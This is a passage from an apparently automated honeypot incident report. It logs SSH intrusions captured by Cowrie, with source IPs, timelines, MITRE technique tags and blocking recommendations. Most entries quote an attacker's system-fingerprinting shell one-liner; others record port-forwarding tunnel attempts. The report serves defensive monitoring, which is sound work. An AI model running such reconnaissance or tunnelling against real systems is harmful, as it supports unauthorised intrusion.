| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:29:40` | `cowrie.session.connect` |
| `2026-07-15 19:29:41` | `cowrie.client.version` |
| `2026-07-15 19:29:41` | `cowrie.client.kex` |
| `2026-07-15 19:29:43` | `cowrie.login.success` |
| `2026-07-15 19:29:44` | `cowrie.session.params` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.success` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:44` | `cowrie.command.input` |
| `2026-07-15 19:29:45` | `cowrie.log.closed` |
| `2026-07-15 19:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2a19790123

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:31 |
| **Last Seen** | 2026-07-15 19:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:31:16` | `cowrie.session.connect` |
| `2026-07-15 19:31:16` | `cowrie.client.version` |
| `2026-07-15 19:31:16` | `cowrie.client.kex` |
| `2026-07-15 19:31:18` | `cowrie.login.success` |
| `2026-07-15 19:31:18` | `cowrie.session.params` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.success` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.command.input` |
| `2026-07-15 19:31:19` | `cowrie.log.closed` |
| `2026-07-15 19:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a3b5865aa5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:33 |
| **Last Seen** | 2026-07-15 19:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:33:18` | `cowrie.session.connect` |
| `2026-07-15 19:33:18` | `cowrie.client.version` |
| `2026-07-15 19:33:18` | `cowrie.client.kex` |
| `2026-07-15 19:33:18` | `cowrie.login.success` |
| `2026-07-15 19:33:19` | `cowrie.session.params` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.success` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:19` | `cowrie.command.input` |
| `2026-07-15 19:33:20` | `cowrie.log.closed` |
| `2026-07-15 19:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c385a4a2e44a

| Field | Detail |
|---|---|
| **Source IP** | `65.20.161[.]126` |
| **First Seen** | 2026-07-15 19:35 |
| **Last Seen** | 2026-07-15 19:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:35:11` | `cowrie.session.connect` |
| `2026-07-15 19:35:11` | `cowrie.client.version` |
| `2026-07-15 19:35:11` | `cowrie.client.kex` |
| `2026-07-15 19:35:13` | `cowrie.login.success` |
| `2026-07-15 19:35:13` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.161[.]126` to AbuseIPDB if not already reported
- [ ] Block `65.20.161[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f00ebc0ee17

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]25` |
| **First Seen** | 2026-07-15 19:35 |
| **Last Seen** | 2026-07-15 19:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:35:20` | `cowrie.session.connect` |
| `2026-07-15 19:35:21` | `cowrie.client.version` |
| `2026-07-15 19:35:21` | `cowrie.client.kex` |
| `2026-07-15 19:35:23` | `cowrie.login.success` |
| `2026-07-15 19:35:24` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]25` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]25` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ebe2919acf1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:36 |
| **Last Seen** | 2026-07-15 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:36:34` | `cowrie.session.connect` |
| `2026-07-15 19:36:34` | `cowrie.client.version` |
| `2026-07-15 19:36:34` | `cowrie.client.kex` |
| `2026-07-15 19:36:34` | `cowrie.login.success` |
| `2026-07-15 19:36:35` | `cowrie.session.params` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.success` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.command.input` |
| `2026-07-15 19:36:35` | `cowrie.log.closed` |
| `2026-07-15 19:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f9d78dda1a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:38 |
| **Last Seen** | 2026-07-15 19:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:38:57` | `cowrie.session.connect` |
| `2026-07-15 19:38:57` | `cowrie.client.version` |
| `2026-07-15 19:38:57` | `cowrie.client.kex` |
| `2026-07-15 19:38:59` | `cowrie.login.success` |
| `2026-07-15 19:38:59` | `cowrie.session.params` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.success` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:38:59` | `cowrie.command.input` |
| `2026-07-15 19:39:00` | `cowrie.log.closed` |
| `2026-07-15 19:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf8b0a11bb16

| Field | Detail |
|---|---|
| **Source IP** | `218.21.241[.]50` |
| **First Seen** | 2026-07-15 19:39 |
| **Last Seen** | 2026-07-15 19:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:39:18` | `cowrie.session.connect` |
| `2026-07-15 19:39:19` | `cowrie.client.version` |
| `2026-07-15 19:39:19` | `cowrie.client.kex` |
| `2026-07-15 19:39:21` | `cowrie.login.success` |
| `2026-07-15 19:39:22` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `218.21.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d49f4aafcecd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:40 |
| **Last Seen** | 2026-07-15 19:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:40:50` | `cowrie.session.connect` |
| `2026-07-15 19:40:50` | `cowrie.client.version` |
| `2026-07-15 19:40:50` | `cowrie.client.kex` |
| `2026-07-15 19:40:52` | `cowrie.login.success` |
| `2026-07-15 19:40:53` | `cowrie.session.params` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.success` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.command.input` |
| `2026-07-15 19:40:53` | `cowrie.log.closed` |
| `2026-07-15 19:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dafcd4d09c9

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]87` |
| **First Seen** | 2026-07-15 19:41 |
| **Last Seen** | 2026-07-15 19:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:41:48` | `cowrie.session.connect` |
| `2026-07-15 19:41:48` | `cowrie.client.version` |
| `2026-07-15 19:41:48` | `cowrie.client.kex` |
| `2026-07-15 19:41:51` | `cowrie.login.success` |
| `2026-07-15 19:41:51` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]87` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]87` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdb112b89e62

| Field | Detail |
|---|---|
| **Source IP** | `185.81.94[.]58` |
| **First Seen** | 2026-07-15 19:41 |
| **Last Seen** | 2026-07-15 19:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:41:57` | `cowrie.session.connect` |
| `2026-07-15 19:41:57` | `cowrie.client.version` |
| `2026-07-15 19:41:57` | `cowrie.client.kex` |
| `2026-07-15 19:41:58` | `cowrie.login.success` |
| `2026-07-15 19:41:58` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.81.94[.]58` to AbuseIPDB if not already reported
- [ ] Block `185.81.94[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88972b252e1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 19:41 |
| **Last Seen** | 2026-07-15 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:41:57` | `cowrie.session.connect` |
| `2026-07-15 19:41:57` | `cowrie.client.version` |
| `2026-07-15 19:41:57` | `cowrie.client.kex` |
| `2026-07-15 19:41:58` | `cowrie.login.success` |
| `2026-07-15 19:41:58` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:41:58` | `cowrie.direct-tcpip.data` |
| `2026-07-15 19:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f6d84eefc3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:42 |
| **Last Seen** | 2026-07-15 19:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:42:35` | `cowrie.session.connect` |
| `2026-07-15 19:42:35` | `cowrie.client.version` |
| `2026-07-15 19:42:35` | `cowrie.client.kex` |
| `2026-07-15 19:42:37` | `cowrie.login.success` |
| `2026-07-15 19:42:38` | `cowrie.session.params` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.success` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.command.input` |
| `2026-07-15 19:42:38` | `cowrie.log.closed` |
| `2026-07-15 19:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d880b330abb

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 19:44 |
| **Last Seen** | 2026-07-15 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:44:01` | `cowrie.session.connect` |
| `2026-07-15 19:44:01` | `cowrie.client.version` |
| `2026-07-15 19:44:01` | `cowrie.client.kex` |
| `2026-07-15 19:44:01` | `cowrie.login.success` |
| `2026-07-15 19:44:02` | `cowrie.session.params` |
| `2026-07-15 19:44:02` | `cowrie.command.input` |
| `2026-07-15 19:44:02` | `cowrie.log.closed` |
| `2026-07-15 19:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6936178177b5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:44 |
| **Last Seen** | 2026-07-15 19:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:44:35` | `cowrie.session.connect` |
| `2026-07-15 19:44:35` | `cowrie.client.version` |
| `2026-07-15 19:44:35` | `cowrie.client.kex` |
| `2026-07-15 19:44:37` | `cowrie.login.success` |
| `2026-07-15 19:44:38` | `cowrie.session.params` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.success` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.command.input` |
| `2026-07-15 19:44:38` | `cowrie.log.closed` |
| `2026-07-15 19:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c14defad1f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:46 |
| **Last Seen** | 2026-07-15 19:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:46:58` | `cowrie.session.connect` |
| `2026-07-15 19:46:58` | `cowrie.client.version` |
| `2026-07-15 19:46:58` | `cowrie.client.kex` |
| `2026-07-15 19:46:58` | `cowrie.login.success` |
| `2026-07-15 19:46:59` | `cowrie.session.params` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.success` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.command.input` |
| `2026-07-15 19:47:00` | `cowrie.log.closed` |
